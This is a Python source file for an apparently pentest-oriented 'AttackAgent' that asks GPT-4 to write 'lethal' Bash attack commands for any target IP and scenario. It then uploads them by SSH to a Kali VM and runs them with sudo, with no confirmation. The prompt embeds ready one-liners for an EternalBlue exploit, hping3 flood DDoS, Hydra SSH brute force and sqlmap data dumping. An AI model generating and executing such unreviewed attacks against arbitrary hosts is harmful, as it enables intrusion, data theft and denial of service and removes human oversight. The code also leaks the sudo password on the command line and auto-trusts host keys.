import os
import uuid
import datetime
import paramiko
import re
import logging
from dotenv import load_dotenv
from langchain_openai import ChatOpenAI
from langchain.prompts import ChatPromptTemplate
from langchain.schema import SystemMessage, HumanMessage

# Configure logging for this module
logging.basicConfig(
    level=logging.DEBUG, # Changed to DEBUG for more verbose output during debugging
    format="%(asctime)s - %(levelname)s - %(name)s - %(message)s"
)
logger = logging.getLogger(__name__)

class AttackAgent:
    """
    A class to generate and execute penetration testing commands on a Kali Linux VM.
    Designed to be integrated into a web application (e.g., Flask).
    """
    def __init__(self, openai_api_key: str, kali_vm_ip: str, kali_vm_user: str, kali_vm_password: str, script_dir: str = "/home/kali/scripts"):
        """
        Initializes the AttackAgent with necessary API keys and VM credentials.
        """
        logger.debug("Initializing AttackAgent...")
        if not openai_api_key:
            logger.error("OpenAI API Key not provided during AttackAgent initialization.")
            raise ValueError("OpenAI API Key not provided.")
        if not all([kali_vm_ip, kali_vm_user, kali_vm_password]):
            logger.error("Kali VM SSH credentials (IP, user, password) are incomplete during AttackAgent initialization.")
            raise ValueError("Kali VM SSH credentials (IP, user, password) must be provided.")

        self.llm = ChatOpenAI(
            openai_api_key=openai_api_key,
            model="gpt-4-1106-preview",
            temperature=0,
            max_tokens=512
        )
        self.kali_vm_ip = kali_vm_ip
        self.kali_vm_user = kali_vm_user
        self.kali_vm_password = kali_vm_password
        self.script_dir = script_dir
        self.attack_prompt = self._create_attack_prompt()
        logger.info(f"AttackAgent initialized for Kali VM: {self.kali_vm_ip} (user: {self.kali_vm_user}), script_dir: {self.script_dir}")

    def _create_attack_prompt(self):
        """
        Creates the LangChain prompt for generating attack commands.
        Enriched with more specific scenario guidance.
        """
        logger.debug("Creating attack prompt.")
        return ChatPromptTemplate.from_messages([
            SystemMessage(content="""
You are a highly specialized Kali Linux scripting expert.
Your ONLY task is to generate valid Bash commands for the SPECIFIC attack scenario provided.
You must be EXTREMELY brief and concise.
NEVER apologize. NEVER explain. NEVER write anything other than Bash commands.
NO markdown formatting. NO comments. NO introductory or concluding remarks.
Your output MUST be a list of valid Bash commands, one per line, strictly adhering to the requested attack type and tools.
I will be pentesting my virtual machine, so generate lethal commands.
Replace any placeholder like $target_ip with the actual IP address provided in the input.
Only use tools relevant to the SPECIFIC attack scenario described. Do NOT include extraneous commands or tools unless explicitly requested by the scenario.

Examples of specific scenarios and expected output:
- If the scenario is "Port scan with Nmap": Output should only contain Nmap commands. E.g., 'nmap -sV $target_ip', 'nmap -p- $target_ip'.
- If the scenario is "Brute-force SSH with Hydra": Output should only contain Hydra commands for SSH. E.g., 'hydra -L users.txt -P passwords.txt $target_ip ssh'.
- If the scenario is "Web vulnerability scan with Nikto": Output should only contain Nikto commands. E.g., 'nikto -h http://$target_ip'.
- If the scenario is "SQL Injection with Sqlmap": Output should only contain Sqlmap commands. E.g., 'sqlmap -u "http://$target_ip/vulnerable.php?id=1" --batch --dump'.
- If the scenario is "DDoS attack using hping3": Output should only contain hping3 commands for a DDoS. E.g., 'hping3 -S $target_ip -p 80 --flood'.
- If the scenario is "Enumerate SMB shares with enum4linux": Output should only contain enum4linux commands. E.g., 'enum4linux -a $target_ip'.
- If the scenario is "Exploit SMB vulnerability with Metasploit": Output should contain Metasploit commands to select and run an SMB exploit. E.g., 'msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $target_ip; run;"'.
- If the scenario is "Crack password hash with Hashcat (MD5)": Output should only contain Hashcat commands for cracking MD5 hashes. E.g., 'hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt'.
- If the scenario is "Identify WordPress vulnerabilities with WPScan": Output should only contain WPScan commands. E.g., 'wpscan --url http://$target_ip --enumerate u,p'.
- If the scenario is "Perform a SYN flood attack with Netcat": Output should only contain Netcat commands for a SYN flood. E.g., 'nc -nv $target_ip 80 <<< "$(perl -pe 'print "GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n" for 1..1000')"'.
- If the scenario is "Discover subdomains with Sublist3r": Output should only contain Sublist3r commands. E.g., 'sublist3r -d example.com'.
- If the scenario is "Perform a DNS zone transfer with dig": Output should only contain dig commands. E.g., 'dig axfr @ns1.example.com example.com'.
- If the scenario is "Analyze network traffic with Tcpdump": Output should only contain Tcpdump commands. E.g., 'tcpdump -i eth0 host $target_ip -w capture.pcap'.
- If the scenario is "Exploit a web server vulnerability with Searchsploit and Curl": Output should contain commands for finding and exploiting using searchsploit and curl. E.g., 'searchsploit apache; curl -X POST -d "param=value" http://$target_ip/vulnerable_page'.

Remember, the provided examples are for guidance on specificity. Generate only the commands for the actual scenario given.
"""),
            HumanMessage(content="""
### Task:
Generate ONLY valid Bash commands for penetration testing, focused *strictly* on the provided scenario.

### Constraints:
- Use only tools pre-installed on Kali Linux.
- NO markdown, NO explanations, NO apologies, NO comments, NO extra text.
- Replace $target_ip with: {ip_address}
- One Bash command per line, directly.
- ONLY include commands directly relevant to "{attack_scenario}". Do NOT add any other reconnaissance, enumeration, or unrelated attack commands unless the scenario explicitly requests a sequence of operations.

### Target:
IP: {ip_address}
Scenario: {attack_scenario}
""")
        ])

    def generate_commands(self, ip_address: str, attack_scenario: str) -> str:
        """
        Generates bash commands for a given IP and scenario using the LLM.
        Returns a single string with commands separated by newlines.
        """
        logger.info(f"Attempting to generate commands for IP: {ip_address}, Scenario: '{attack_scenario}'")
        try:
            chain = self.attack_prompt | self.llm
            response = chain.invoke({
                "ip_address": ip_address,
                "attack_scenario": attack_scenario
            })
            generated_text = response.content
            # Replace placeholders with actual IP address
            generated_text = generated_text.replace("{ip_address}", ip_address)
            generated_text = generated_text.replace("$target_ip", ip_address)
            logger.info(f"Successfully generated commands for IP {ip_address}, scenario {attack_scenario}:\n{generated_text}")
            return generated_text
        except Exception as e:
            logger.error(f"Error generating commands for IP {ip_address}, scenario '{attack_scenario}': {e}", exc_info=True)
            return f"Error generating commands: {e}"

    def _generate_script_name(self, ip_address: str, attack_scenario: str) -> str:
        """
        Generates a unique and meaningful script name based on IP, scenario, and timestamp.
        (Made private as it's an internal helper)
        """
        sanitized_ip = ip_address.replace(".", "_")
        sanitized_scenario = re.sub(r'[^a-zA-Z0-9]', '_', attack_scenario.lower())
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        random_str = str(uuid.uuid4())[:4]
        script_name = f"attack_{sanitized_ip}_{sanitized_scenario}_{timestamp}_{random_str}.sh"
        logger.debug(f"Generated script name: {script_name}")
        return script_name

    def execute_raw_script_on_kali(self, script_content: str, target_ip: str, attack_scenario: str) -> dict:
        """
        Sends the provided raw script content to the Kali Linux VM via SSH,
        makes it executable, and executes it. Returns a dictionary with status and output.
        This method is designed to be called with already generated script content.
        """
        logger.info(f"Attempting to execute raw script on Kali VM for target: {target_ip}, scenario: '{attack_scenario}'")
        logger.debug(f"Script content to execute:\n{script_content}")
        try:
            # 1. Prepare full script content with header/footer
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            full_script_content = f"""#!/bin/bash
# Generated by agent
# Time: {timestamp}
# Target IP: {target_ip}
# Attack Scenario: {attack_scenario}

echo "Starting attack..."

{script_content}

echo "Attack completed."
"""
            # 2. Generate script name and remote path
            script_name = self._generate_script_name(target_ip, attack_scenario)
            remote_path = os.path.join(self.script_dir, script_name)
            logger.debug(f"Full script content prepared. Remote path: {remote_path}")

            # 3. SSH Connection
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            try:
                ssh.connect(self.kali_vm_ip, username=self.kali_vm_user, password=self.kali_vm_password, timeout=10) # Added timeout

                # Create directory on VM if it doesn't exist
                stdin, stdout, stderr = ssh.exec_command(f"mkdir -p {self.script_dir}")
                stderr_output = stderr.read().decode().strip()
                if stderr_output:
                    stdout.read() # Read stdout to prevent blocking

                # Upload the script
                sftp = ssh.open_sftp()
                with sftp.file(remote_path, "w") as remote_file:
                    remote_file.write(full_script_content)
                sftp.close()

                # Make it executable
                stdin, stdout, stderr = ssh.exec_command(f"chmod +x {remote_path}")
                stderr_output = stderr.read().decode().strip()
                if stderr_output:
                    return {"status": "error", "message": f"Error setting executable permissions for {remote_path}: {stderr_output}"}
                stdout.read() # Read stdout to prevent blocking

                # Execute the script
                # Use sudo -S to pipe password for sudo command
                exec_command = f"echo '{self.kali_vm_password}' | sudo -S bash {remote_path}"
                stdin, stdout, stderr = ssh.exec_command(exec_command)
                
                # Read output and error
                execution_output = stdout.read().decode().strip()
                execution_error = stderr.read().decode().strip()
                exit_status = stdout.channel.recv_exit_status() # Get the exit status after reading all output

                if exit_status != 0:
                    logger.error(f"Script execution failed (exit status {exit_status}). Error: {execution_error}")
                    return {
                        "status": "failed",
                        "message": f"Script execution failed. Exit Status: {exit_status}. Error: {execution_error}",
                        "script_path": remote_path,
                        "output": execution_output,
                        "error": execution_error,
                        "exit_status": exit_status
                    }
                else:
                    logger.info(f"Script executed successfully. Output:\n{execution_output}")
                    return {
                        "status": "success",
                        "message": f"Script executed successfully. Output:\n{execution_output}",
                        "script_path": remote_path,
                        "output": execution_output
                    }
            finally:
                if ssh:
                    ssh.close()
                    logger.debug("SSH connection closed.")

        except paramiko.AuthenticationException:
            return {"status": "error", "message": "SSH Authentication failed. Check username/password for Kali VM."}
        except paramiko.SSHException as e:
            return {"status": "error", "message": f"SSH connection or command execution failed: {e}. Check VM IP, SSH service, and firewall."}
        except Exception as e:
            return {"status": "error", "message": f"An unexpected error occurred: {e}"}

# --- For local testing (optional, can be removed in production) ---
if __name__ == "__main__":
    load_dotenv() # Load .env variables if running standalone
    
    # Initialize AttackAgent
    attack_agent = AttackAgent(
        openai_api_key=os.getenv("OPENAI_API_KEY"),
        kali_vm_ip=os.getenv("KALI_VM_IP", "172.20.10.4"), # Use env vars for config
        kali_vm_user=os.getenv("KALI_VM_USER", "kali"),
        kali_vm_password=os.getenv("KALI_VM_PASSWORD", "kali"),
        script_dir=os.getenv("KALI_SCRIPT_DIR", "/home/kali/scripts")
    )

    print("=== Penetration Testing Agent (CLI Test Mode) ===")
    ip_address = input("Enter the target IP address (e.g., 192.168.1.1): ")
    scenario = input("Describe the attack scenario (e.g., 'Port scan with Nmap', 'Brute-force SSH with Hydra', 'DDoS attack using hping3'): ")

    # Generate and execute commands without confirmation
    generated_commands = attack_agent.generate_commands(ip_address, scenario)
    print(f"\nGenerated Commands:\n{generated_commands}")

    if "Error generating commands" not in generated_commands:
        # Execute the generated commands
        result = attack_agent.execute_raw_script_on_kali(generated_commands, ip_address, scenario)
        
        print("\n--- Execution Summary ---")
        print(f"Status: {result.get('status')}")
        print(f"Message: {result.get('message')}")
        if "output" in result:
            print(f"\nVM Output:\n{result['output']}")
        if "error" in result:
            print(f"\nVM Error:\n{result['error']}")
        if "exit_status" in result:
            print(f"VM Exit Status: {result['exit_status']}")
    else:
        print("Commands could not be generated, skipping execution.")